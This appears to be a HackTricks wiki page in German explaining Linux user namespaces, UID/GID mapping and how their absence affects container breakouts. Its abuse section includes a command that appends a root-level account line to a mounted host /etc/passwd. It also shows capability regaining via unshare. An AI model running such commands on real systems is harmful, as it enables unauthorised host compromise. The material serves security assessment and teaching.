# Benutzer-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Übersicht

Der Benutzer-Namespace ändert die Bedeutung von Benutzer- und Gruppen-IDs, indem der Kernel IDs, die innerhalb des Namespace gesehen werden, auf andere IDs außerhalb abbildet. Dies ist einer der wichtigsten modernen Container-Schutzmechanismen, weil er direkt das größte historische Problem klassischer Container adressiert: **root innerhalb des Containers war früher unbehaglich nahe an root auf dem Host**.

Mit user namespaces kann ein Prozess als UID 0 innerhalb des Containers laufen und trotzdem einem unprivilegierten UID-Bereich auf dem Host entsprechen. Das bedeutet, der Prozess kann viele Aufgaben innerhalb des Containers wie root ausführen, während er aus Sicht des Hosts deutlich weniger mächtig ist. Das löst nicht jedes Container-Sicherheitsproblem, aber es verändert die Folgen einer Container-Kompromittierung erheblich.

## Funktionsweise

Ein user namespace hat Mapping-Dateien wie `/proc/self/uid_map` und `/proc/self/gid_map`, die beschreiben, wie Namespace-IDs in Parent-IDs übersetzt werden. Wenn root innerhalb des Namespace auf eine unprivilegierte Host-UID abgebildet wird, haben Operationen, die echtes Host-root erfordern würden, nicht mehr dieselbe Bedeutung. Deshalb sind user namespaces zentral für **rootless containers** und einer der größten Unterschiede zwischen älteren rootful Container-Standardeinstellungen und moderneren Least-Privilege-Designs.

Der Punkt ist subtil, aber entscheidend: root innerhalb des Containers wird nicht eliminiert, es wird **übersetzt**. Der Prozess erlebt lokal weiterhin eine root-ähnliche Umgebung, aber der Host sollte ihn nicht als volles root behandeln.

## Lab

Ein manueller Test ist:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Das lässt den aktuellen Benutzer innerhalb des namespace als root erscheinen, während er außerhalb auf dem Host nicht root ist. Es ist eine der besten einfachen Demos, um zu verstehen, warum user namespaces so wertvoll sind.

In containers kannst du die sichtbare Zuordnung vergleichen mit:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Die genaue Ausgabe hängt davon ab, ob die Engine user namespace remapping verwendet oder eine traditionellere rootful-Konfiguration.

Sie können die Zuordnung auch von der Host-Seite mit folgendem Befehl auslesen:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Laufzeitnutzung

Rootless Podman ist eines der deutlichsten Beispiele dafür, dass Benutzer-Namespaces als erstklassiger Sicherheitsmechanismus behandelt werden. Rootless Docker ist ebenfalls darauf angewiesen. Die userns-remap-Unterstützung von Docker verbessert auch die Sicherheit bei rootful-Daemon-Deployments, obwohl viele Deployments historisch aus Kompatibilitätsgründen deaktiviert blieben. Die Kubernetes-Unterstützung für Benutzer-Namespaces hat sich verbessert, aber Adoption und Defaults variieren je nach Runtime, Distribution und Cluster-Policy. Incus/LXC-Systeme verlassen sich ebenfalls stark auf UID/GID shifting und idmapping-Konzepte.

Der allgemeine Trend ist klar: Umgebungen, die Benutzer-Namespaces ernsthaft nutzen, liefern in der Regel eine bessere Antwort auf die Frage "what does container root actually mean?" als Umgebungen, die das nicht tun.

## Erweiterte Mapping-Details

Wenn ein unprivilegierter Prozess in `uid_map` oder `gid_map` schreibt, wendet der Kernel strengere Regeln an als bei einem privilegierten Schreiber aus dem übergeordneten Namespace. Es sind nur eingeschränkte Mappings erlaubt, und für `gid_map` muss der Schreiber üblicherweise zuerst `setgroups(2)` deaktivieren:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Dieses Detail ist wichtig, weil es erklärt, warum die user-namespace-Einrichtung in rootless-Experimenten manchmal scheitert und warum runtimes sorgfältige Hilfslogik zur UID/GID-Delegation benötigen.

Eine weitere fortgeschrittene Funktion ist der **ID-mapped mount**. Anstatt die on-disk Besitzrechte zu ändern, wendet ein ID-mapped mount eine user-namespace-Zuordnung auf ein Mount an, sodass Besitzverhältnisse durch diese Mount-Ansicht übersetzt erscheinen. Das ist besonders relevant in rootless- und modernen runtime-Setups, weil es die Nutzung gemeinsamer host-Pfade erlaubt, ohne rekursive `chown`-Operationen. Aus Sicht der Sicherheit verändert die Funktion, wie schreibbar ein bind mount von innen im Namespace erscheint, obwohl sie die zugrundeliegenden Filesystem-Metadaten nicht umschreibt.

Schließlich: Wenn ein Prozess einen neuen user namespace erstellt oder betritt, erhält er ein vollständiges Capabilities-Set **innerhalb dieses Namespace**. Das bedeutet nicht, dass er plötzlich host-weite Macht erlangt. Es bedeutet, dass diese Capabilities nur dort genutzt werden können, wo das Namespace-Modell und andere Schutzmechanismen es erlauben. Deshalb kann `unshare -U` plötzlich Mount- oder namespace-lokale privilegierte Operationen möglich machen, ohne die Host-root-Grenze direkt aufzuheben.

## Fehlkonfigurationen

Die größte Schwäche ist einfach, user namespaces in Umgebungen nicht zu verwenden, in denen sie möglich wären. Wenn container root zu direkt auf host root abgebildet wird, werden writable host mounts und privilegierte Kernel-Operationen deutlich gefährlicher. Ein weiteres Problem ist, Host-user-namespace-Sharing zu erzwingen oder Remapping aus Kompatibilitätsgründen zu deaktivieren, ohne zu erkennen, wie stark sich dadurch die Vertrauensgrenze verändert.

User namespaces müssen auch zusammen mit dem restlichen Modell betrachtet werden. Selbst wenn sie aktiv sind, kann eine breite runtime-API-Exposition oder eine sehr schwache runtime-Konfiguration Privilegieneskalation über andere Pfade weiterhin ermöglichen. Ohne sie hingegen werden viele alte Breakout-Klassen deutlich leichter ausnutzbar.

## Missbrauch

Wenn der container rootful ist ohne user namespace-Trennung, wird ein writable host bind mount deutlich gefährlicher, weil der Prozess möglicherweise tatsächlich als host root schreibt. Gefährliche Capabilities werden dadurch ebenfalls bedeutungsvoller. Der Angreifer muss nicht mehr so hart gegen die Übersetzungsgrenze kämpfen, weil diese kaum noch existiert.

Das Vorhandensein oder Fehlen eines user namespace sollte früh geprüft werden, wenn man einen container-Breakout-Pfad evaluiert. Es beantwortet nicht jede Frage, aber es zeigt sofort, ob "root in container" direkte Relevanz für den Host hat.

Das praktischste Missbrauchsmuster besteht darin, die Zuordnung zu bestätigen und dann sofort zu testen, ob auf dem Host eingehängte Inhalte mit host-relevanten Privilegien schreibbar sind:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Wenn die Datei als echter Host-root erstellt wird, ist die Isolation des user namespace für diesen Pfad effektiv aufgehoben. Ab diesem Punkt werden klassische host-file abuses realistisch:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Eine sicherere Bestätigung während einer Live-Bewertung ist, einen harmlosen Marker zu schreiben, anstatt kritische Dateien zu verändern:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Diese Prüfungen sind wichtig, weil sie die eigentliche Frage schnell beantworten: Wird root in diesem Container so eng auf host root abgebildet, dass ein beschreibbares host mount sofort zu einem Pfad zur Kompromittierung des Hosts wird?

### Vollständiges Beispiel: Wiedererlangen von namespace-lokalen capabilities

Wenn seccomp `unshare` erlaubt und die Umgebung eine frische user namespace zulässt, kann der Prozess innerhalb dieser neuen namespace wieder den vollen Satz an capabilities erlangen:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Das ist an sich kein host escape. Der Grund, warum das wichtig ist, ist, dass user namespaces privilegierte namespace-local Aktionen wieder aktivieren können, die sich später mit weak mounts, vulnerable kernels oder badly exposed runtime surfaces kombinieren.

## Checks

Diese Befehle sollen die wichtigste Frage auf dieser Seite beantworten: Wofür wird root innerhalb dieses container auf dem host abgebildet?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
- Wenn der Prozess UID 0 ist und die maps eine direkte oder sehr nahe host-root mapping anzeigen, ist der Container deutlich gefährlicher.
- Wenn root auf einen unprivileged host range abgebildet ist, ist das eine deutlich sicherere Ausgangsbasis und deutet normalerweise auf echte user namespace isolation hin.
- Die mapping files sind wertvoller als `id` allein, da `id` nur die namespace-lokale Identität anzeigt.

Wenn der Workload als UID 0 läuft und das mapping zeigt, dass dies eng dem host root entspricht, sollten Sie die übrigen Privilegien des Containers deutlich strenger bewerten.
{{#include ../../../../../banners/hacktricks-training.md}}
